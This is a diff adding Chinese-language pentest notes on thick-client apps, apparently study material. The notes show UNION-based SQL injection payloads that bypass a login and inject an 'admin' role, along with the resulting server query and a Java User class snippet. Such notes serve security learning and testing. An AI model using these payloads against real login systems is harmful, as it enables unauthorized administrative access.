@@ -203,4 +203,30 @@ Tick / Fat APP:
 
   https://java-decompiler.github.io/            decode .jar
 
+  尽管客户端发送到服务器的哈希值与数据库中的不匹配，且密码比较失败，但使用 UNION 查询仍然可以进行SQL注入
+  MariaDB [userdb]> select * from users where username='test' union select 'admin', 'welcome123';
   
+  在username注入:  test' UNION SELECT 1,'invaliduser','invalid@a.b','invalidpass','admin
+      修改验证代码如下:
+                public User(int uid, String username, String password, String email, Role role) {
+                this.uid = uid;
+                this.username = username;
+                this.password = password;
+                this.email = email;
+                this.role = role;
+                }
+                public void setPassword(String password) {
+                this.password = password;
+                }
+  
+  尝试在 username 字段中使用载荷 abc' UNION SELECT 1,'abc','a@b.com','abc','admin，在 password 字段中使用随机文本 abc 进行登录
+  服务器注入:  select id,username,email,password,role from users where username='abc' UNION SELECT 1,'abc','a@b.com','abc','admin'
+
+
+
+
+
+
+
+
+
